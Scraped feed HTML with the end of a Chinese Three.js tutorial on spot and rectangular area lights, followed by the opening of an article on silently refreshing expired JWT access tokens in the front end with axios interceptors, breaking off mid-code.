<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/272dc31be014483aaa68fbbb1b65bc98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6Z54yr5LiN54Ot:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730366&amp;x-signature=dXTMCIz%2Bs6zbPzb3jn1blBLTXW8%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2"><a href="https://link.juejin.cn?target=https%3A%2F%2Fthreejs.org%2Fdocs%2F%23api%2Fzh%2Flights%2FSpotLight" target="_blank" title="https://threejs.org/docs/#api/zh/lights/SpotLight" ref="nofollow noopener noreferrer"><code>SpotLight</code></a>聚光灯</h2>
<p>聚光灯光源, 可以看做是一个点光源被一个圆锥体限制住了光照范围</p>
<p>但实际有两个圆锥, 内圆锥和外圆锥, 光照强度在两个锥体间从设定的强度递减到 0</p>
<p>类似方向光一样需要一个目标点, 光源位置是圆锥的顶点, 目标点处于圆锥的中轴线上</p>
<p>常用于聚光灯、手电筒灯光, 有阴影</p>
<pre><code class="hljs language-js" lang="js">  <span class="hljs-keyword">const</span> spotColor = <span class="hljs-number">0xffffff</span>;
  <span class="hljs-keyword">const</span> spotIntensity = <span class="hljs-number">150</span>;
  <span class="hljs-keyword">const</span> spotLight = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">SpotLight</span>(spotColor, spotIntensity);
  spotLight.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);
  spotLight.<span class="hljs-property">angle</span> = <span class="hljs-number">10</span>; <span class="hljs-comment">// 聚光灯照射角度，单位：弧度</span>
  scene.<span class="hljs-title function_">add</span>(spotLight);
  <span class="hljs-comment">// 要将目标位置更改为默认值以外的任何位置，必须将其添加到场景中。</span>
  scene.<span class="hljs-title function_">add</span>(spotLight.<span class="hljs-property">target</span>);

  <span class="hljs-keyword">const</span> spotHelper = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">SpotLightHelper</span>(spotLight);
  scene.<span class="hljs-title function_">add</span>(spotHelper);
  
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">updateSpotLight</span>(<span class="hljs-params"/>) {
    spotHelper.<span class="hljs-title function_">update</span>();
  }
    
   <span class="hljs-comment">// 添加 gui 控制</span>
  <span class="hljs-keyword">const</span> spotLightFolder = gui.<span class="hljs-title function_">addFolder</span>(<span class="hljs-string">"聚光灯控制"</span>);
  <span class="hljs-comment">// 聚光灯的圆锥顶部大小通过 angle 属性控制</span>
  <span class="hljs-comment">// 以弧度作单位</span>
  spotLightFolder
    .<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DegRadHelper</span>(spotLight, <span class="hljs-string">"angle"</span>), <span class="hljs-string">"value"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">90</span>)
    .<span class="hljs-title function_">name</span>(<span class="hljs-string">"angle"</span>)
    .<span class="hljs-title function_">onChange</span>(updateSpotLight);
    
  <span class="hljs-comment">// penumbra为 0 时, 内外圆锥大小一致</span>
  <span class="hljs-comment">// penumbra为 1 时, 内圆锥大小为 0, 光照强度从中轴线开始向外递减</span>
  <span class="hljs-comment">// penumbra 为 0.5 时,光照强度从外圆锥半径的中点处开始往外递减</span>
  <span class="hljs-comment">// 具体表现为聚光灯打向的位置的光是锐利还是模糊</span>
  spotLightFolder.<span class="hljs-title function_">add</span>(spotLight, <span class="hljs-string">"penumbra"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0.01</span>).<span class="hljs-title function_">onChange</span>(updateSpotLight);
  <span class="hljs-title function_">makeXYZGUI</span>(spotLightFolder, spotLight.<span class="hljs-property">position</span>, <span class="hljs-string">"position"</span>, updateSpotLight);
  

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea7e8a32c04347c5bb5132814c96a254~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6Z54yr5LiN54Ot:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730366&amp;x-signature=0mP3ynTJ2gRktPCLIhyVWPfAgds%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b664ae5e6dc4f9590bfeac6b51262be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6Z54yr5LiN54Ot:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730366&amp;x-signature=u4tV7MJP3JRjRfHGNcCf5Bkv8To%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-3"><a href="https://link.juejin.cn?target=https%3A%2F%2Fthreejs.org%2Fdocs%2F%23api%2Fzh%2Flights%2FRectAreaLight" target="_blank" title="https://threejs.org/docs/#api/zh/lights/RectAreaLight" ref="nofollow noopener noreferrer"><code>RectAreaLight</code></a> 矩阵区域光源</h2>
<p>矩形区域光源, 表示一个矩形区域发射出来的光照</p>
<p>例如长条日光灯或天花磨砂玻璃透进来的自然光</p>
<p>只能影响<code>MeshStandardMaterial</code> 和 <code>MeshPhysicalMaterial</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 由于光照计算复杂, 将其着色分离到单独库中, 需要手动引入 RectAreaLightUniformsLib 和 RectAreaLightHelper</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">RectAreaLightUniformsLib</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"three/addons/lights/RectAreaLightUniformsLib.js"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">RectAreaLightHelper</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"three/addons/helpers/RectAreaLightHelper.js"</span>;
<span class="hljs-comment">// 初始化</span>
<span class="hljs-title class_">RectAreaLightUniformsLib</span>.<span class="hljs-title function_">init</span>();


<span class="hljs-keyword">const</span> rectColor = <span class="hljs-number">0xffffff</span>;
<span class="hljs-keyword">const</span> rectIntensity = <span class="hljs-number">5</span>;
<span class="hljs-keyword">const</span> rectWidth = <span class="hljs-number">10</span>;
<span class="hljs-keyword">const</span> rectHeight = <span class="hljs-number">4</span>;
<span class="hljs-keyword">const</span> rectLight = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">RectAreaLight</span>(rectColor, rectIntensity, rectWidth, rectHeight);
rectLight.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);

<span class="hljs-comment">// 与其他光线不同, rectAreaLight 不是使用目标点（`target`），而是使用自身的旋转角度来确定光照方向。</span>
rectLight.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = <span class="hljs-variable constant_">THREE</span>.<span class="hljs-property">MathUtils</span>.<span class="hljs-title function_">degToRad</span>(-<span class="hljs-number">90</span>);
scene.<span class="hljs-title function_">add</span>(rectLight);

<span class="hljs-comment">// 另外，矩形光的辅助对象应该添加为光照的子节点，而不是添加为场景的子节点。</span>
<span class="hljs-keyword">const</span> rectHelper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RectAreaLightHelper</span>(rectLight);
rectLight.<span class="hljs-title function_">add</span>(rectHelper);


<span class="hljs-comment">// gui 属性控制</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">updateRectLight</span>(<span class="hljs-params"/>) {
    rectLight.<span class="hljs-title function_">updateMatrixWorld</span>();
  }
  <span class="hljs-keyword">const</span> rectLightFolder = gui.<span class="hljs-title function_">addFolder</span>(<span class="hljs-string">"矩形区域光控制"</span>);
  rectLightFolder.<span class="hljs-title function_">addColor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ColorGUIHelper</span>(rectLight, <span class="hljs-string">"color"</span>), <span class="hljs-string">"value"</span>).<span class="hljs-title function_">name</span>(<span class="hljs-string">"color"</span>);
  rectLightFolder.<span class="hljs-title function_">add</span>(rectLight, <span class="hljs-string">"intensity"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>).<span class="hljs-title function_">onChange</span>(updateRectLight);
  rectLightFolder.<span class="hljs-title function_">add</span>(rectLight, <span class="hljs-string">"width"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>).<span class="hljs-title function_">onChange</span>(updateRectLight);
  rectLightFolder.<span class="hljs-title function_">add</span>(rectLight, <span class="hljs-string">"height"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>).<span class="hljs-title function_">onChange</span>(updateRectLight);
  <span class="hljs-title function_">makeXYZGUI</span>(rectLightFolder, rectLight.<span class="hljs-property">position</span>, <span class="hljs-string">"position"</span>, updateRectLight);
  <span class="hljs-title function_">makeXYZGUI</span>(rectLightFolder, rectLight.<span class="hljs-property">rotation</span>, <span class="hljs-string">"rotation"</span>, updateRectLight);

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fbd396616584898971092b377262e74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6Z54yr5LiN54Ot:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730366&amp;x-signature=rmY%2BfF%2FYhZ%2FfEDZHJiLm19S61DU%3D" alt="image.png" loading="lazy"/></p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[我的项目实战（十一）- 双 Token无感刷新：前端如何优雅处理 JWT 过期问题]]></title>    <link>https://juejin.cn/post/7602440800296173614</link>    <guid>https://juejin.cn/post/7602440800296173614</guid>    <pubDate>2026-02-03T13:03:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602440800296173614" data-draft-id="7602488966609764390" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="我的项目实战（十一）- 双 Token无感刷新：前端如何优雅处理 JWT 过期问题  "/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-03T13:03:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ETA8"/> <meta itemprop="url" content="https://juejin.cn/user/608445545328347"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            我的项目实战（十一）- 双 Token无感刷新：前端如何优雅处理 JWT 过期问题  
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/608445545328347/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ETA8
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:03:43.000Z" title="Tue Feb 03 2026 13:03:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在上一篇文章《[我的项目实战（十）] 现代 Web 鉴权体系：从登录到双 Token 机制的全流程实践》中，我们完整梳理了后端如何通过 <strong>JWT + Refresh Token</strong> 构建安全、可扩展的身份认证系统。但一个完整的鉴权闭环，不仅需要服务端的设计，更离不开前端对 token 生命周期的精细管理。</p>
<p>今天这篇文章，我们将聚焦于那个“用户正在写笔记，突然请求失败跳回登录页”的经典痛点，深入探讨：<strong>前端如何实现真正意义上的“无感刷新”？</strong></p>
<p>我们将一步步解决并发控制、请求重试、状态同步等一系列工程难题，构建出一套稳定、低侵入、适用于真实项目的响应拦截机制，并解析其背后的设计哲学。</p>
<hr/>
<h2 data-id="heading-0">一、问题的本质：401 不等于“请登录”</h2>
<p>当我们使用 JWT 做身份认证时，总会遇到这样一个场景：</p>
<blockquote>
<p>用户 A 登录成功，拿到有效期为 15 分钟的 <code>access_token</code>。<br/>
第 16 分钟，他点击保存草稿，接口返回 <code>401 Unauthorized</code>。</p>
</blockquote>
<p>此时，如果直接弹窗提示“登录已过期，请重新登录”，体验是非常割裂的——用户明明一直在操作，凭什么说没就没？</p>
<p>但如果我们能在这背后悄悄完成一次 token 刷新，并把刚才失败的请求自动重试，整个过程用户完全无感知，这就叫 <strong>“无感刷新”</strong>。</p>
<p>而实现它的关键，在于正确理解 <strong>401 的语义差异</strong>：</p>




















<table><thead><tr><th>场景</th><th>含义</th><th>应对策略</th></tr></thead><tbody><tr><td>access_token 过期</td><td>可恢复的状态异常</td><td>自动刷新，重试请求</td></tr><tr><td>refresh_token 失效 / 用户登出</td><td>身份彻底失效</td><td>引导重新登录</td></tr></tbody></table>
<p>我们的目标，就是精准识别第一种情况，并在不干扰用户的前提下完成自救。</p>
<hr/>
<h2 data-id="heading-1">二、初步尝试：最简单的刷新逻辑</h2>
<p>先来看一个朴素版本：</p>
<pre><code class="hljs language-ts" lang="ts">axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-property">data</span>,
  <span class="hljs-keyword">async</span> error =&gt; {
    <span class="hljs-keyword">const</span> { config, response } = error;

    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">status</span> === <span class="hljs-number">401</span>) {
      <span class="hljs-comment">// 尝试刷新 token</span>
      <span class="hljs-keyword">const</span> newToken = <span class="hljs-keyword">await</span> <span class="hljs-title function_">refreshToken</span>();
      <span class="hljs-comment">// 修改原请求 header</span>
      config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${newToken}</span>`</span>;
      <span class="hljs-comment">// 重新发送</span>
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">axios</span>(config);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);
  }
);
</code></pre>
<p>看起来没问题？其实隐患重重。</p>
<h3 data-id="heading-2">❌ 问题 1：并发请求导致多次刷新</h3>
<p>假设页面同时发出三个请求 A、B、C，它们几乎同时因 token 过期返回 401。那么这三条都会进入上述逻辑，结果是：</p>
<ul>
<li>三次调用 <code>/auth/refresh</code></li>
<li>可能触发服务端防重放机制导致后续失败</li>
<li>最终状态混乱</li>
</ul>
<h3 data-id="heading-3">❌ 问题 2：B 和 C 请求永远丢失</h3>
<p>A 开始刷新，B 和 C 不应该立即重试，而应等待 A 拿到新 token 后再继续。否则会出现：</p>
<ul>
<li>B 在 A 完成前就发起重试 → 仍用旧 token → 再次 401</li>
<li>陷入无限循环或重复刷新</li>
</ul>
<p>所以，我们必须引入一种“协调机制”。</p>
<hr/>
<h2 data-id="heading-4">三、核心设计：锁 + 队列模式</h2>
<p>为了应对并发与依赖关系，我们采用经典的 <strong>“锁 + 请求队列”</strong> 模式。</p>
<h3 data-id="heading-5">1. 全局状态定义</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> isRefreshing = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 是否正在刷新 token</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">requestsQueue</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-function">(<span class="hljs-params">token: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>&gt; = []; <span class="hljs-comment">// 待处理请求队列</span>
</code></pre>
<ul>
<li><code>isRefreshing</code> 是一把互斥锁，确保同一时间只有一个 refresh 流程在执行。</li>
<li><code>requestsQueue</code> 存放那些需要等待新 token 的请求。</li>
</ul>
<h3 data-id="heading-6">2. 拦截器中的分流处理</h3>
<p>当某个请求遇到 401：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">if</span> (response.<span class="hljs-property">status</span> === <span class="hljs-number">401</span> &amp;&amp; !config.<span class="hljs-property">_retry</span>) {
  <span class="hljs-keyword">if</span> (isRefreshing) {
    <span class="hljs-comment">// 已有刷新任务在进行，当前请求加入队列等待</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
      requestsQueue.<span class="hljs-title function_">push</span>(<span class="hljs-function">(<span class="hljs-params">token: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
        config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>;
        <span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">axios</span>(config));
      });
    });
  }

  <span class="hljs-comment">// 否则由我来主导刷新</span>
  isRefreshing = <span class="hljs-literal">true</span>;
  config.<span class="hljs-property">_retry</span> = <span class="hljs-literal">true</span>;

  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> { access_token } = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/auth/refresh'</span>, {
      <span class="hljs-attr">refresh_token</span>: <span class="hljs-title function_">getRefreshToken</span>()
    });

    <span class="hljs-comment">// 更新全局状态</span>
    <span class="hljs-title function_">setAuthToken</span>(access_token);

    <span class="hljs-comment">// 执行队列中所有等待的请求</span>
    requestsQueue.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">callback</span> =&gt;</span> <span class="hljs-title function_">callback</span>(access_token));
    requestsQueue = [];

    <span class="hljs-comment">// 重发当前请求</span>
    config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${access_token}</span>`</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">axios</span>(config);

  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-title function_">logout</span>();
    <span class="hljs-title function_">redirectToLogin</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(e);
  } <span class="hljs-keyword">finally</span> {
    isRefreshing = <span class="hljs-literal">false</span>;
  }
}
</code></pre>
<p>这个结构看似复杂，实则层次清晰：</p>
<ol>
<li><strong>判断是否首次触发</strong>：避免重复刷新；</li>
<li><strong>如果是竞争者，则排队等候</strong>：利用闭包保存请求上下文；</li>
<li><strong>如果是发起者，则承担刷新职责</strong>：获取新 token、通知队友、重发自己；</li>
<li><strong>统一清理资源</strong>：释放锁，防止死锁。</li>
</ol>
<hr/>
<h2 data-id="heading-7">四、关键技术点剖析</h2>
<h3 data-id="heading-8">1. <code>_retry</code> 标志位的作用</h3>
<p>你可能会问：为什么需要 <code>_retry</code>？</p>
<p>设想没有它，会发生什么？</p>
<ul>
<li>请求 A 收到 401，开始刷新流程；</li>
<li>刷新完成后，用新 token 重发 A；</li>
<li>新的 A 请求再次进入拦截器；</li>
<li>此时又是一个 401？→ 继续刷新 → 无限循环！</li>
</ul>
<p>因此，我们在第一次捕获时打上标记：</p>
<pre><code class="hljs language-ts" lang="ts">config.<span class="hljs-property">_retry</span> = <span class="hljs-literal">true</span>;
</code></pre>
<p>这样下次再遇到同一个请求就不会重复处理。</p>
<blockquote>
<p>💡 注意：<code>_retry</code> 是自定义字段，不会被发送到后端，仅用于内部流程控制。</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">2. 队列中的回调函数是如何工作的？</h3>
<p>重点看这一段：</p>
<pre><code class="hljs language-ts" lang="ts">requestsQueue.<span class="hljs-title function_">push</span>(<span class="hljs-function">(<span class="hljs-params">token</span>) =&gt;</span> {
  config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>;
  <span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">axios</span>(config));
});
</code></pre>
<p>这里形成了一个典型的 <strong>Promise + 闭包</strong> 结构：</p>
<ul>
<li><code>resolve</code> 来自当前请求的 Promise；</li>
<li><code>config</code> 是当前请求的配置对象；</li>
<li>当 future 某个时刻传入新 token 时，就能动态修改 header 并重新发起请求。</li>
</ul>
<p>本质上，我们把“将来要用新 token 重试”的能力封装成了一个可延迟执行的函数。</p>
<hr/>
<h3 data-id="heading-10">3. 为什么要在 finally 中释放锁？</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">finally</span> {
  isRefreshing = <span class="hljs-literal">false</span>;
}
</code></pre>
<p>这是极其重要的一步。如果刷新过程中发生网络错误、服务端异常或代码抛错，<code>try...catch</code> 会中断执行流，跳过后续逻辑。</p>
<p>如果不放在 <code>finally</code>，就会造成：</p>
<ul>
<li><code>isRefreshing</code> 一直为 <code>true</code></li>
<li>后续所有请求都被卡在队列里</li>
<li>整个应用无法发起任何受保护接口请求</li>
</ul>
<p>这就是典型的 <strong>资源泄漏</strong> 问题。务必保证锁的释放是原子且必然的。</p>
<hr/>
<h2 data-id="heading-11">五、边界情况与容错设计</h2>
<p>再稳健的机制也要面对现实世界的不确定性。以下是几个必须考虑的边缘场景：</p>
<h3 data-id="heading-12">场景 1：refresh_token 也已过期</h3>
<p>用户长时间未操作，连 refresh_token 都失效了。此时 <code>/auth/refresh</code> 请求也会返回 401。</p>
<p>我们应在 catch 块中统一处理：</p>
<pre><code class="hljs language-ts" lang="ts">useUserStore.<span class="hljs-title function_">getState</span>().<span class="hljs-title function_">logout</span>();
<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'/login'</span>;
</code></pre>
<p>并清除本地存储的所有凭证。</p>
<hr/>
<h3 data-id="heading-13">场景 2：多个标签页共享登录状态</h3>
<p>用户在一个标签页登出，其他页面仍可能持有旧 token。虽然本次机制无法主动感知，但我们可以通过监听 localStorage 变化来辅助清理：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'storage'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">'auth'</span> &amp;&amp; e.<span class="hljs-property">newValue</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// 检测到登出事件</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'/login'</span>)) {
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'/login'</span>;
    }
  }
});
</code></pre>
<p>前提是登出时写入 storage 事件。</p>
<hr/>
<h3 data-id="heading-14">场景 3：网络不稳定导致刷新失败</h3>
<p>偶尔的网络抖动可能导致 refresh 请求失败。是否应该重试？</p>
<p>取决于业务敏感度：</p>
<ul>
<li>普通系统：直接登出即可；</li>
<li>高可用要求：可在 catch 中加入指数退避重试（最多 2 次）；</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> retries = <span class="hljs-number">0</span>;
<span class="hljs-keyword">const</span> maxRetries = <span class="hljs-number">2</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">tryRefresh</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// ...正常刷新</span>
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-keyword">if</span> (retries &lt; maxRetries) {
      retries++;
